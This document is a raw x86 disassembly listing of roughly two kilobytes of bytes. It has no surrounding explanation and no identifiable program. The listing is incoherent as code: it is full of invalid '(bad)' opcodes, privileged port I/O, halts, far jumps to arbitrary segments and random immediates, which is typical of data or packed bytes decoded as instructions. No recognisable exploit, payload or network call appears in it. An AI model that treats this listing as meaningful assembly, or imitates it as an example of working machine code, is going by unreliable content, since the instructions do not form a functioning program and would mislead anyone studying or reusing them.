  4114dc:	and    DWORD PTR [edi+eax*2],0xffffff9a
  4114e0:	jmp    0xe209:0x800dd14a
  4114e7:	loop   0x4114f7
  4114e9:	inc    esi
  4114ea:	mov    esi,DWORD PTR [eax+ebp*1+0x19]
  4114ee:	and    bl,BYTE PTR [eax]
  4114f0:	in     al,dx
  4114f1:	aas    
  4114f2:	push   eax
  4114f3:	xor    DWORD PTR [esp+eax*8],esi
  4114f6:	push   es
  4114f7:	mov    ah,0xcf
  4114f9:	(bad)  [edi]
  4114fb:	popf   
  4114fc:	icebp  
  4114fd:	sub    eax,0xa2216cec
  411502:	lods   eax,DWORD PTR ds:[esi]
  411503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411504:	test   ch,ch
  411506:	pop    es
  411507:	ror    BYTE PTR [edi+0x53],cl
  41150a:	mov    esi,0xcd39fba8
  41150f:	inc    esp
  411510:	hlt    
  411511:	mov    eax,0x310340f2
  411516:	das    
  411517:	stos   BYTE PTR es:[edi],al
  411518:	mov    ah,BYTE PTR [ebp+0x41]
  41151b:	popf   
  41151c:	(bad)  
  41151d:	jbe    0x41158d
  41151f:	nop
  411520:	or     eax,0x977100c4
  411525:	mov    ecx,0x7578cf35
  41152a:	inc    ebx
  41152b:	addr16 loop 0x41150d
  41152e:	les    ebx,FWORD PTR [eax+0x1c]
  411531:	data16 shl BYTE PTR [edx+0x67d57e5c],cl
  411538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41153a:	(bad)  
  41153b:	pop    ecx
  41153c:	cmp    eax,0xa897108b
  411541:	sti    
  411542:	cld    
  411543:	(bad)  
  411544:	fdiv   DWORD PTR [ebx]
  411546:	mov    al,gs:0xc8d360e2
  41154c:	mov    ebx,0x1e32a04b
  411551:	int    0xb2
  411553:	loope  0x411539
  411555:	push   es
  411556:	dec    esi
  411557:	push   0x7cd08612
  41155c:	jmp    0xbeb2b4a3
  411561:	mov    ah,0x60
  411563:	es (bad) 
  411565:	in     eax,0x27
  411567:	sbb    BYTE PTR [eax+edi*4],ch
  41156a:	jb     0x41156d
  41156c:	mov    esi,0xa2b7fed1
  411571:	gs jle 0x411538
  411574:	repz push es
  411576:	jmp    0x389a:0x3831357f
  41157d:	je     0x411591
  41157f:	sub    BYTE PTR [esp+edx*8],dh
  411582:	outs   dx,BYTE PTR ds:[esi]
  411583:	sub    DWORD PTR [edi-0x1c],edi
  411586:	and    al,0xf
  411588:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411589:	dec    esp
  41158a:	cmp    BYTE PTR [ebx],dl
  41158c:	inc    ebp
  41158d:	jbe    0x41160a
  41158f:	aam    0x4b
  411591:	int3   
  411592:	xor    ebx,DWORD PTR [ebx]
  411594:	out    dx,eax
  411595:	mov    bl,0x73
  411597:	adc    BYTE PTR cs:[ebx],ah
  41159a:	add    DWORD PTR [eax],ecx
  41159c:	out    dx,al
  41159d:	inc    eax
  41159e:	push   ecx
  41159f:	and    BYTE PTR [eax-0x1a],dl
  4115a2:	dec    eax
  4115a3:	dec    ebx
  4115a4:	push   esp
  4115a5:	mov    BYTE PTR [ebp+0x53dae622],bl
  4115ab:	xor    esi,DWORD PTR [edx]
  4115ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115af:	rcr    ch,1
  4115b1:	fwait
  4115b2:	sahf   
  4115b3:	and    eax,0x158d7ac7
  4115b8:	xchg   BYTE PTR [eax-0x2611d90a],ah
  4115be:	dec    ebx
  4115bf:	rcr    edx,cl
  4115c1:	pop    ebp
  4115c2:	push   ss
  4115c3:	outs   dx,BYTE PTR ds:[esi]
  4115c4:	jmp    0xaf45:0x8de25bbf
  4115cb:	or     ah,bh
  4115cd:	jmp    0xf88f:0xe34872d5
  4115d4:	scas   al,BYTE PTR es:[edi]
  4115d5:	push   cs
  4115d6:	stos   BYTE PTR es:[edi],al
  4115d7:	push   ss
  4115d8:	dec    esi
  4115d9:	jns    0x411633
  4115db:	aam    0x24
  4115dd:	mov    al,0xa0
  4115df:	cmp    eax,DWORD PTR [esp+edx*4]
  4115e2:	sbb    al,0x14
  4115e4:	cmc    
  4115e5:	out    dx,eax
  4115e6:	fbld   TBYTE PTR [edi]
  4115e8:	sbb    esi,ebp
  4115ea:	inc    BYTE PTR [ebx]
  4115ec:	dec    esi
  4115ed:	inc    ecx
  4115ee:	fild   DWORD PTR [ecx-0x14eb3470]
  4115f4:	adc    eax,0xe9bb9a50
  4115f9:	push   ss
  4115fa:	inc    ebp
  4115fb:	(bad)  
  4115fc:	xor    al,0xe4
  4115fe:	es mov edi,0xed74e776
  411604:	mov    eax,ds:0x89958ca9
  411609:	stc    
  41160a:	sbb    edx,eax
  41160c:	jno    0x4115b1
  41160e:	daa    
  41160f:	and    ecx,DWORD PTR [ecx]
  411611:	xor    DWORD PTR ds:0x9c01f,edx
  411617:	sbb    eax,0x5a9435e8
  41161c:	call   0x8d82:0x2fc7bb80
  411623:	cmp    edx,ecx
  411625:	ds (bad) 
  411627:	fld    st(0)
  411629:	dec    esp
  41162a:	ins    BYTE PTR es:[edi],dx
  41162b:	ja     0x411684
  41162d:	sub    al,0x4d
  41162f:	dec    esp
  411630:	adc    al,0x83
  411632:	adc    eax,0xcbf9d88
  411637:	fadd   st,st(2)
  411639:	cdq    
  41163a:	repz sar BYTE PTR [ebx-0x75],cl
  41163e:	add    eax,0xf784701b
  411643:	sub    DWORD PTR [eax+0x0],0xbe59950
  41164a:	dec    edx
  41164b:	sub    eax,edx
  41164d:	loop   0x4115df
  41164f:	loop   0x411615
  411651:	data16 (bad) 
  411653:	cld    
  411654:	mov    eax,ds:0xa432ae2e
  411659:	jmp    0x411663
  41165b:	aas    
  41165c:	ins    DWORD PTR es:[edi],dx
  41165d:	mov    bh,0x83
  41165f:	outs   dx,DWORD PTR ds:[esi]
  411660:	aas    
  411661:	or     BYTE PTR [esp+ecx*1],dh
  411664:	outs   dx,BYTE PTR ds:[esi]
  411665:	mov    dh,0xb2
  411667:	push   0x1fa533e7
  41166c:	dec    edx
  41166d:	mov    ah,dh
  41166f:	mov    edx,DWORD PTR [edx]
  411671:	lods   al,BYTE PTR ds:[esi]
  411672:	mov    edi,0x562dbab3
  411677:	in     al,dx
  411678:	inc    edx
  411679:	xlat   BYTE PTR ds:[ebx]
  41167a:	lods   al,BYTE PTR ds:[esi]
  41167b:	jne    0x4116dc
  41167d:	in     eax,0x2
  41167f:	jae    0x411690
  411681:	jl     0x4116c1
  411683:	xchg   ecx,eax
  411684:	iret   
  411685:	jo     0x411628
  411687:	ins    BYTE PTR es:[edi],dx
  411688:	push   edx
  411689:	mov    ds:0xa621dff0,eax
  41168e:	jge    0x41169d
  411690:	jns    0x411623
  411692:	and    DWORD PTR [edi+0x53317f6b],esi
  411698:	sbb    ah,BYTE PTR [ebx+0x69]
  41169b:	push   DWORD PTR [ebp+0x23]
  41169e:	cwde   
  41169f:	xor    DWORD PTR [ebp-0x32],ebx
  4116a2:	data16 xchg BYTE PTR [esi+0x59e0a432],bl
  4116a9:	mov    dh,BYTE PTR [ebp+edx*1+0x0]
  4116ad:	push   cs
  4116ae:	add    BYTE PTR [esi+0x65],0x7b
  4116b2:	jecxz  0x411705
  4116b4:	xchg   edx,eax
  4116b5:	daa    
  4116b6:	or     DWORD PTR [eax],ebx
  4116b8:	adc    DWORD PTR [esi-0x42],edx
  4116bb:	test   al,0x35
  4116bd:	fwait
  4116be:	or     BYTE PTR [ecx+0xd851299],0x86
  4116c5:	dec    ecx
  4116c6:	dec    eax
  4116c7:	add    eax,0xc2360de7
  4116cc:	xor    BYTE PTR [esp+ecx*2],ch
  4116cf:	mov    WORD PTR [esi+0x6c1da03d],gs
  4116d5:	xor    edi,0xee745286
  4116db:	or     ah,bl
  4116dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116de:	hlt    
  4116df:	dec    ebp
  4116e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e1:	sbb    esi,DWORD PTR [eax+0x18]
  4116e4:	loope  0x41170c
  4116e6:	repnz adc eax,0x49d8ec2a
  4116ec:	int    0xb7
  4116ee:	add    esi,DWORD PTR [ebx+ecx*1-0x7da32be5]
  4116f5:	inc    BYTE PTR [edx+0x17]
  4116f8:	push   ebp
  4116f9:	data16 fistp QWORD PTR [eax+eax*1-0xe006b15]
  411701:	out    dx,al
  411702:	sbb    DWORD PTR [ebp+0x5c],edx
  411705:	ret    
  411706:	sbb    ch,BYTE PTR [ebp-0x5362e3d1]
  41170c:	cmp    DWORD PTR [edx],esp
  41170e:	clc    
  41170f:	add    edi,edi
  411711:	pop    esi
  411712:	lahf   
  411713:	test   BYTE PTR [ebx-0x5f081f66],0xd8
  41171a:	(bad)  
  41171b:	neg    DWORD PTR [ebx-0x5]
  41171e:	ss enter 0x789b,0x88
  411723:	cmp    bh,BYTE PTR [ebx-0x2c]
  411726:	mov    ds:0x6ecb6ace,al
  41172b:	cmp    bl,BYTE PTR [ebx-0x5b8956aa]
  411731:	jp     0x4116cb
  411733:	daa    
  411734:	dec    edx
  411735:	lahf   
  411736:	aas    
  411737:	repnz mov ebx,0xcfa9c7c8
  41173d:	ret    
  41173e:	or     dh,BYTE PTR [esi-0x26]
  411741:	mov    DWORD PTR [esi+0x2cc4bec6],ecx
  411747:	loop   0x4116f9
  411749:	inc    edx
  41174a:	retf   0xd320
  41174d:	retf   0x7334
  411750:	mov    WORD PTR [edi+0x3cc4b8a7],gs
  411756:	stos   DWORD PTR es:[edi],eax
  411757:	mov    eax,0x755bbab7
  41175c:	popa   
  41175d:	(bad)  
  41175e:	into   
  41175f:	dec    ebp
  411760:	inc    ebp
  411761:	cs ds scas eax,DWORD PTR es:[edi]
  411764:	retf   0x4643
  411767:	inc    ebx
  411768:	ins    DWORD PTR es:[edi],dx
  411769:	xchg   ecx,eax
  41176a:	fnstcw WORD PTR [eax]
  41176c:	retf   0x956a
  41176f:	imul   edx,esi,0xffffffc4
  411772:	lock retf 
  411774:	mov    eax,ss
  411776:	les    ebx,FWORD PTR [ebx-0x2a]
  411779:	adc    al,0x69
  41177b:	adc    BYTE PTR [ebp-0x78],dh
  41177e:	adc    al,0x9
  411780:	mov    ?,WORD PTR [eax-0x1]
  411783:	sbb    al,0x40
  411785:	adc    ah,BYTE PTR [eax+0x7dd56e78]
  41178b:	fcom   DWORD PTR [edx+ecx*8+0x4dc65d34]
  411792:	adc    bh,ah
  411794:	scas   al,BYTE PTR es:[edi]
  411795:	jmp    0x6e62ed85
  41179a:	xchg   ebx,eax
  41179b:	sub    BYTE PTR [ebp-0x6de2ee42],0x43
  4117a2:	call   0xc8fe68b9
  4117a7:	pop    ebx
  4117a8:	int    0x47
  4117aa:	ret    0x8de8
  4117ad:	inc    ebx
  4117ae:	ror    DWORD PTR [edx-0x3270200c],0x8b
  4117b5:	push   ecx
  4117b6:	retf   0x1876
  4117b9:	cmp    DWORD PTR [ecx],eax
  4117bb:	cmp    al,0x5e
  4117bd:	arpl   WORD PTR [edi-0x1d],cx
  4117c0:	add    al,0x43
  4117c2:	mov    esi,0x665acd2e
  4117c7:	or     DWORD PTR [ebp-0x5f],edi
  4117ca:	leave  
  4117cb:	dec    esi
  4117cc:	aaa    
  4117cd:	mov    bh,0xf6
  4117cf:	add    ebp,DWORD PTR [ebx+0x7e68223c]
  4117d5:	add    DWORD PTR [ebx+0x16],eax
  4117d8:	mov    esp,0x362ff3e2
  4117dd:	outs   dx,DWORD PTR ds:[esi]
  4117de:	mov    eax,0x2ea20be7
  4117e3:	in     eax,0x9e
  4117e5:	adc    eax,0x8cc9635e
  4117ea:	fbld   TBYTE PTR [ecx-0x3fc22a3]
  4117f0:	call   0x1919:0x4c3bb716
  4117f7:	repz mov cl,0xcc
  4117fa:	ins    DWORD PTR es:[edi],dx
  4117fb:	xor    eax,0xa12f01cb
  411800:	dec    edx
  411801:	mov    WORD PTR [eax],?
  411803:	jnp    0x4117d1
  411805:	popf   
  411806:	test   DWORD PTR [esi-0x68],0x3eb143ba
  41180d:	mov    esi,edi
  41180f:	push   ds
  411810:	nop
  411811:	lea    edx,[ebx+0x53]
  411814:	in     eax,dx
  411815:	addr16 ror al,cl
  411818:	and    BYTE PTR [eax-0x4c],al
  41181b:	stc    
  41181c:	jle    0x41188b
  41181e:	push   ecx
  41181f:	mov    ch,0x95
  411821:	sbb    al,0xad
  411823:	daa    
  411824:	add    al,0x9a
  411826:	outs   dx,DWORD PTR es:[esi]
  411828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411829:	cmp    al,0x10
  41182b:	shl    DWORD PTR [esi+ecx*1+0x5816b1a4],0xf1
  411833:	ins    BYTE PTR es:[edi],dx
  411834:	sbb    cl,BYTE PTR [ebx+0x50]
  411837:	fisub  DWORD PTR [esi]
  411839:	or     al,0x7b
  41183b:	js     0x411822
  41183d:	stos   DWORD PTR es:[edi],eax
  41183e:	xchg   esi,eax
  41183f:	std    
  411840:	pusha  
  411841:	xor    al,0x96
  411843:	loope  0x4117f1
  411845:	popf   
  411846:	icebp  
  411847:	xor    cl,BYTE PTR ds:0x191ea51f
  41184d:	sub    BYTE PTR [ebp-0xb0dbbd],dh
  411853:	scas   al,BYTE PTR es:[edi]
  411854:	hlt    
  411855:	in     eax,dx
  411856:	pushf  
  411857:	dec    eax
  411858:	fst    DWORD PTR [edx+0x14c24cc5]
  41185e:	cmp    al,0x22
  411860:	xchg   ebx,eax
  411861:	jmp    0x276a5aa5
  411866:	mov    dh,0x99
  411868:	mov    eax,ds:0xdd831a95
  41186d:	xor    ecx,DWORD PTR [eax+0x7cba645a]
  411873:	ret    
  411874:	dec    esp
  411875:	daa    
  411876:	xchg   esi,eax
  411877:	out    dx,al
  411878:	adc    al,0x7
  41187a:	push   eax
  41187b:	or     al,BYTE PTR [ecx]
  41187d:	pop    ss
  41187e:	mov    edx,esp
  411880:	or     BYTE PTR [ebx+0x1c],ah
  411883:	sbb    ch,BYTE PTR [edi-0x7a]
  411886:	push   esi
  411887:	sbb    BYTE PTR [ebx+edi*8-0x700dd759],ah
  41188e:	sub    ebx,DWORD PTR [edi-0x23fecc45]
  411894:	jb     0x4118b2
  411896:	push   edx
  411897:	outs   dx,BYTE PTR ds:[esi]
  411898:	jmp    0xecbc:0xb27a0176
  41189f:	imul   eax,edx,0x1
  4118a2:	stos   BYTE PTR es:[edi],al
  4118a3:	cwde   
  4118a4:	push   esi
  4118a5:	sbb    dl,BYTE PTR [ecx+0x1ce8eeb9]
  4118ab:	or     DWORD PTR [ecx-0x67d7dbca],edx
  4118b1:	pop    edx
  4118b2:	and    DWORD PTR [edx-0x2c501c3c],esp
  4118b8:	das    
  4118b9:	fdivr  QWORD PTR ds:0xd82d011e
  4118bf:	lock shl BYTE PTR [edi-0x151e6aa5],1
  4118c6:	cmp    BYTE PTR [ecx-0x9cf2474],ah
  4118cc:	int3   
  4118cd:	pop    ds
  4118ce:	jae    0x4118c1
  4118d0:	je     0x411920
  4118d2:	push   edi
  4118d3:	loopne 0x4118b8
  4118d5:	aad    0xed
  4118d7:	and    DWORD PTR [ebx],ecx
  4118d9:	hlt    
  4118da:	inc    ecx
  4118db:	pop    ds
  4118dc:	jo     0x411893
  4118de:	mov    bh,0xd7
  4118e0:	fisubr WORD PTR ds:0xa939c433
  4118e6:	rol    DWORD PTR [eax],1
  4118e8:	inc    ebp
  4118e9:	(bad)  
  4118ea:	pop    esp
  4118eb:	aad    0x55
  4118ed:	stos   BYTE PTR es:[edi],al
  4118ee:	and    ch,BYTE PTR [ebp-0x3c]
  4118f1:	mov    esp,0xdaaf4e18
  4118f6:	push   edi
  4118f7:	jle    0x411926
  4118f9:	sahf   
  4118fa:	cmp    esi,DWORD PTR [esi]
  4118fc:	sub    dl,ch
  4118fe:	je     0x41196a
  411900:	jb     0x41189e
  411902:	mov    eax,0xbbb7335d
  411907:	mov    ebx,0xbfaf5c50
  41190c:	arpl   sp,sp
  41190e:	pop    ss
  41190f:	in     eax,0x42
  411911:	dec    esp
  411912:	adc    al,0xe6
  411914:	hlt    
  411915:	or     al,0xdf
  411917:	push   edx
  411918:	repz jns 0x411923
  41191b:	adc    BYTE PTR [ebp+0x3edb7a9f],ch
  411921:	outs   dx,DWORD PTR ds:[esi]
  411922:	dec    esi
  411923:	jmp    0xf0290808
  411928:	adc    bl,BYTE PTR [edi+edi*2-0x7e]
  41192c:	pop    ebp
  41192d:	jmp    0xbee5:0xd38b706
  411934:	cmp    ebx,ecx
  411936:	add    al,bl
  411938:	pop    esp
  411939:	stos   BYTE PTR es:[edi],al
  41193a:	je     0x4119b1
  41193c:	xlat   BYTE PTR ds:[ebx]
  41193d:	mov    dh,bh
  41193f:	push   eax
  411940:	cmp    ch,bl
  411942:	push   eax
  411943:	dec    ecx
  411944:	jle    0x4118fb
  411946:	(bad)  
  411947:	sub    DWORD PTR [esp+esi*2-0xf1da1ae],ecx
  41194e:	aad    0x71
  411950:	fsub   st,st(0)
  411952:	sub    ch,dl
  411954:	push   esp
  411955:	add    cl,BYTE PTR [ecx+esi*8-0x1dd3cefa]
  41195c:	aam    0x15
  41195e:	stos   BYTE PTR es:[edi],al
  41195f:	je     0x4118ea
  411961:	jnp    0x4119d2
  411963:	out    0x71,eax
  411965:	push   ebp
  411966:	and    cl,BYTE PTR [ecx]
  411968:	or     al,0x6
  41196a:	(bad)  [ecx-0x2d5f7a1d]
  411970:	dec    edi
  411971:	repz shr BYTE PTR [edi],0xa9
  411975:	xchg   ebx,eax
  411976:	adc    BYTE PTR [ebx],dl
  411978:	inc    esi
  411979:	cld    
  41197a:	xchg   DWORD PTR [ebx+0x7],esp
  41197d:	out    dx,al
  41197e:	mov    esp,0xb0dce8f3
  411983:	push   edx
  411984:	bound  ebp,QWORD PTR [ebx+eiz*2-0x5b]
  411988:	mov    ebx,0xcd0842f5
  41198d:	or     cl,BYTE PTR [edi]
  41198f:	lds    ebp,FWORD PTR [ebx-0x65905fed]
  411995:	imul   ebx,DWORD PTR [ebp-0xc9be53],0xffffffaf
  41199c:	pop    esp
  41199d:	loop   0x411928
  41199f:	in     al,0xcf
  4119a1:	fs pop edi
  4119a3:	fsubr  DWORD PTR ds:0xadf590e3
  4119a9:	or     DWORD PTR [ecx],ecx
  4119ab:	sub    DWORD PTR [ebp-0x68a5177],0xffb1c103
  4119b5:	retfw  0x3ed9
  4119b9:	daa    
  4119ba:	jmp    0x7d42:0x9ed69e97
  4119c1:	sub    edx,DWORD PTR [edx+0x43]
  4119c4:	das    
  4119c5:	and    DWORD PTR ds:0x9da88852,0x4d
  4119cc:	test   eax,0xbbb1e498
  4119d1:	push   ebx
  4119d2:	(bad)  
  4119d3:	pushf  
  4119d4:	pushf  
  4119d5:	add    BYTE PTR [edi],al
  4119d7:	inc    ebp
  4119d8:	call   0x5e2d:0xc7a25410
  4119df:	and    cl,BYTE PTR [eax+0x3c7b1e30]
  4119e5:	rol    ebp,0xe5
  4119e8:	or     ebx,DWORD PTR [esi]
  4119ea:	or     DWORD PTR [ecx+ecx*4],edi
  4119ed:	or     BYTE PTR [ebp-0xd],dl
  4119f0:	xchg   ebp,eax
  4119f1:	pop    ecx
  4119f2:	inc    ebx
  4119f3:	lods   al,BYTE PTR ds:[esi]
  4119f4:	mov    ?,WORD PTR [edi+0x38]
  4119f7:	xor    eax,DWORD PTR [ebp+0x47cbdd2a]
  4119fd:	data16 repz sbb ah,bh
  411a01:	mov    dh,BYTE PTR [eax+eiz*2]
  411a04:	xchg   DWORD PTR [edx-0x6b],edx
  411a07:	(bad)  
  411a08:	pop    esi
  411a09:	test   ebx,ebp
  411a0b:	mov    ch,0x6f
  411a0d:	bnd jb 0x411a61
  411a10:	push   ss
  411a11:	in     al,dx
  411a12:	bnd ret 0x365b
  411a16:	imul   esp,DWORD PTR [esi-0x37f98376],0xd2917889
  411a20:	ins    DWORD PTR es:[edi],dx
  411a21:	jb     0x411a26
  411a23:	clc    
  411a24:	mov    edx,0x932b8f16
  411a29:	mov    ch,0xaa
  411a2b:	scas   eax,DWORD PTR es:[edi]
  411a2c:	inc    esi
  411a2d:	pusha  
  411a2e:	xor    ebx,DWORD PTR [ecx+0x1ba4547e]
  411a34:	mov    dh,0x3d
  411a36:	xchg   esp,eax
  411a37:	in     eax,dx
  411a38:	jmp    0xef14:0x4bdd672c
  411a3f:	pop    ds
  411a40:	ret    0xed1b
  411a43:	fdivr  QWORD PTR [esi+ebp*4-0x19]
  411a47:	fs push esi
  411a49:	sub    BYTE PTR [edi-0x65],al
  411a4c:	leave  
  411a4d:	test   BYTE PTR [esi-0x6e],dh
  411a50:	cmp    al,0x84
  411a52:	xlat   BYTE PTR ds:[ebx]
  411a53:	adc    eax,0xd399199b
  411a58:	loopne 0x411a72
  411a5a:	out    0xfc,al
  411a5c:	sub    bl,bl
  411a5e:	test   DWORD PTR [eax-0x7560ce02],esi
  411a64:	cmp    al,0x45
  411a66:	mov    esi,0x4371da89
  411a6b:	push   0xfffffff9
  411a6d:	das    
  411a6e:	mov    ecx,0xa95d8ec8
  411a73:	dec    edi
  411a74:	sub    al,0x91
  411a76:	and    esi,ebp
  411a78:	fst    QWORD PTR [ebx+0x3fb50acf]
  411a7e:	jge    0x411a09
  411a80:	push   ds
  411a81:	into   
  411a82:	adc    dl,BYTE PTR [esi]
  411a84:	xlat   BYTE PTR ds:[ebx]
  411a85:	jo     0x411a1e
  411a87:	mov    ch,0x7e
  411a89:	js     0x411acd
  411a8b:	add    ebp,DWORD PTR [ebx]
  411a8d:	push   edi
  411a8e:	mov    fs,WORD PTR [ecx-0x7f153cee]
  411a94:	inc    ebp
  411a95:	mov    dl,0xfd
  411a97:	jge    0x411a98
  411a99:	add    BYTE PTR [edi],cl
  411a9b:	mov    al,0xab
  411a9d:	xor    eax,0x8d065b50
  411aa2:	out    0x5,al
  411aa4:	inc    ebp
  411aa5:	(bad)  
  411aa6:	ror    DWORD PTR [eax+0x1fee6a86],1
  411aac:	sbb    DWORD PTR [ebx-0xc91a450],esp
  411ab2:	arpl   ax,sp
  411ab4:	xor    edx,DWORD PTR [esi+eiz*2+0x48d2bab3]
  411abb:	inc    eax
  411abc:	jmp    0x8d6a8
  411ac1:	xlat   BYTE PTR ds:[ebx]
  411ac2:	int3   
  411ac3:	lods   al,BYTE PTR ds:[esi]
  411ac4:	ret    
  411ac5:	imul   eax
  411ac7:	add    al,BYTE PTR [ebp+0x71d136db]
  411acd:	call   0x8a72:0xcba346b8
  411ad4:	xchg   ebp,eax
  411ad5:	jge    0x411ab5
  411ad7:	adc    eax,0xa16b1b6b
  411adc:	xchg   DWORD PTR [ebx-0x385bd82a],esp
  411ae2:	test   al,0xdf
  411ae4:	(bad)  [esi]
  411ae6:	sub    esp,DWORD PTR [ebx+0x21db1410]
  411aec:	mov    edi,0x57dbd31a
  411af1:	sbb    ebp,DWORD PTR [eax+0x31f91d7c]
  411af7:	push   ss
  411af8:	adc    bl,dl
  411afa:	cwde   
  411afb:	jbe    0x411b24
  411afd:	into   
  411afe:	ret    0xeece
  411b01:	inc    eax
  411b02:	add    DWORD PTR [edi+0x25f9e865],edi
  411b08:	mov    esp,ebx
  411b0a:	mov    ebx,0xa4770966
  411b0f:	popf   
  411b10:	aam    0x94
  411b12:	mov    edx,edx
  411b14:	adc    al,0xb6
  411b16:	sub    eax,0x854b7357
  411b1b:	and    al,0x25
  411b1d:	cmp    al,0x5c
  411b1f:	mov    edx,0x800c1594
  411b24:	data16 xchg ch,cl
  411b27:	and    edx,ebp
  411b29:	jg     0x411acf
  411b2b:	loopne 0x411aef
  411b2d:	dec    esi
  411b2e:	adc    DWORD PTR [esi],ecx
  411b30:	cmc    
  411b31:	and    ecx,edx
  411b33:	fwait
  411b34:	add    al,0xad
  411b36:	sar    DWORD PTR [ecx],1
  411b38:	dec    edi
  411b39:	dec    esp
  411b3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b3b:	push   cs
  411b3c:	inc    edx
  411b3d:	std    
  411b3e:	push   ebp
  411b3f:	rcl    DWORD PTR [ebp-0x238dfb98],0xa0
  411b46:	iret   
  411b47:	cmp    esp,DWORD PTR [ebx-0x17bacfc7]
  411b4d:	mov    ah,0xb8
  411b4f:	nop
  411b50:	mov    edx,0xc283dce1
  411b55:	ja     0x411ae7
  411b57:	mov    al,ds:0x11130544
  411b5c:	push   ebp
  411b5d:	jae    0x411b08
  411b5f:	mov    al,0x92
  411b61:	inc    ecx
  411b62:	pop    ebx
  411b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b64:	mov    ebx,0x81026753
  411b69:	adc    al,0x9a
  411b6b:	or     edx,DWORD PTR [eax+0x5a]
  411b6e:	dec    eax
  411b6f:	or     BYTE PTR [di+0x73cf],bl
  411b74:	mov    eax,ds:0x6abb9d99
  411b79:	mov    ebp,0xef412154
  411b7e:	mov    eax,ds:0x26408885
  411b83:	sti    
  411b84:	dec    edx
  411b85:	mov    eax,ds:0x8cb97b01
  411b8a:	fnsave [esi+0x21807836]
  411b90:	(bad)  
  411b91:	fidivr DWORD PTR [edx+0x72]
  411b94:	dec    edi
  411b95:	stc    
  411b96:	mov    cl,0x32
  411b98:	bound  esp,QWORD PTR ds:0x9f40e09b
  411b9e:	loopne 0x411b96
  411ba0:	mov    ebp,0x17ede5b6
  411ba5:	sub    DWORD PTR [edi-0x79],eax
  411ba8:	adc    cl,BYTE PTR [esi+0x528f9ef7]
  411bae:	push   edi
  411baf:	pop    ebx
  411bb0:	add    eax,0xa731cf83
  411bb5:	mov    WORD PTR [eax-0x56e1f719],fs
  411bbb:	stc    
  411bbc:	test   BYTE PTR [edx+ebx*4],cl
  411bbf:	add    ebx,edx
  411bc1:	das    
  411bc2:	das    
  411bc3:	inc    edi
  411bc4:	lods   al,BYTE PTR ds:[esi]
  411bc5:	xor    cl,BYTE PTR [ecx+0x38]
  411bc8:	test   eax,0xf4bdd21e
  411bcd:	inc    edi
  411bce:	je     0x411b69
  411bd0:	xchg   DWORD PTR [edi-0x38],ecx
  411bd3:	loop   0x411c1f
  411bd5:	xlat   BYTE PTR ds:[ebx]
  411bd6:	or     eax,0xecf1a5f7
  411bdb:	and    ebx,DWORD PTR [ebx-0x5e]
  411bde:	sar    DWORD PTR [edx+eiz*8-0x3c],cl
  411be2:	mov    al,0xb3
  411be4:	add    BYTE PTR [ecx],dh
  411be6:	pop    ds
  411be7:	dec    edi
  411be8:	or     BYTE PTR [ebx],ah
  411bea:	or     eax,0x7f87b79f
  411bef:	(bad)  
  411bf1:	cli    
  411bf2:	mov    eax,ds:0xaa514df8
  411bf7:	nop
  411bf8:	aaa    
  411bf9:	and    ch,BYTE PTR [ecx+0x7]
  411bfc:	mov    WORD PTR [edi+0x6a],gs
  411bff:	in     eax,0x2c
  411c01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c02:	sbb    eax,0xc5f272fc
  411c07:	sub    eax,0xd1b5f7f1
  411c0c:	and    DWORD PTR [esi-0x530516bf],0xffffffbd
  411c13:	cs jne 0x411c03
  411c16:	and    eax,0x9e47d30c
  411c1b:	mov    al,0x78
  411c1d:	dec    esp
  411c1e:	dec    edi
  411c1f:	jmp    0xb048a2e0
  411c24:	inc    eax
  411c25:	push   eax
  411c26:	es aam 0x80
  411c29:	pop    edi
  411c2a:	push   cs
  411c2b:	(bad)  
  411c2c:	mov    al,ds:0xc30d0bc
  411c31:	cmp    dh,BYTE PTR [ebx-0x4f]
  411c34:	retf   
  411c35:	push   esp
  411c36:	pop    ebp
  411c37:	jbe    0x411ca7
  411c39:	(bad)  
  411c3a:	jmp    0x411bec
  411c3c:	jnp    0x411bdc
  411c3e:	jmp    0xdda1:0x1d6c4a9b
  411c45:	mov    eax,0xd0412894
  411c4a:	add    cl,0x1e
  411c4d:	and    eax,0x211a84c4
  411c52:	xor    DWORD PTR [eax],0xef365d1c
  411c58:	mov    DWORD PTR [ecx-0x35],edx
  411c5b:	and    dl,BYTE PTR [ebp-0x18e416aa]
  411c61:	push   0xffffff93
  411c63:	xor    eax,0x456187a2
  411c68:	aaa    
  411c69:	pop    ds
  411c6a:	test   esp,edx
  411c6c:	mov    ch,0x2a
  411c6e:	repnz arpl WORD PTR [edi+eiz*1+0x22d09cb8],bp
  411c76:	int3   
  411c77:	sub    eax,0x5fd877c9
  411c7c:	nop
  411c7d:	in     eax,0xcc
  411c7f:	lods   al,BYTE PTR ds:[esi]
  411c80:	adc    al,0x7a
  411c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c83:	test   BYTE PTR [ebx],ah
  411c85:	lock adc al,0x91
  411c88:	inc    ecx
  411c89:	push   ecx
  411c8a:	add    eax,0x896fd1a9
  411c8f:	imul   esp,DWORD PTR [edx],0xfffffffb
  411c92:	(bad)  
  411c93:	shl    DWORD PTR [edi+0x44],cl
  411c96:	jo     0x411ce9
  411c98:	mov    edi,0x8cc787ae
  411c9d:	imul   ebx,DWORD PTR [ebp-0x67],0xffffff8c
  411ca1:	pop    ebp
  411ca2:	jge    0x411c49
  411ca4:	je     0x411c4e
  411ca6:	data16 fld QWORD PTR [ecx+0xa]
  411caa:	icebp  
  411cab:	jne    0x411c67
  411cad:	xor    eax,0xd10b9054
  411cb2:	sub    al,0x75
  411cb4:	pop    eax
  411cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cb6:	int3   
  411cb7:	sbb    eax,0x3f7476ab
  411cbc:	mov    eax,0xdf18f523
  411cc1:	sbb    ecx,eax
  411cc3:	push   0x2ff0bee8
  411cc8:	mov    ebx,0xec785070
  411ccd:	lahf   
  411cce:	dec    edi
  411ccf:	xor    al,0x3d
